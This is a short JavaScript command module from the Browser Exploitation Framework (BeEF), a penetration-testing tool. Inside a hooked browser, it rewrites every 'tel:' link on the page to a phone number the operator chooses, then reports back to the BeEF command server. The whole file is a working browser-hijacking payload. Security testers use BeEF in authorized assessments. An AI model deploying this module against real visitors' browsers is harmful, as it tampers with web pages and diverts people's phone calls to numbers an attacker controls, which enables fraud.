//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var tel_number = "<%= @tel_number %>";
	var selector   = "a";

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteTelLinks(tel_number, selector)+' telephone (tel) links rewritten to '+tel_number);

});

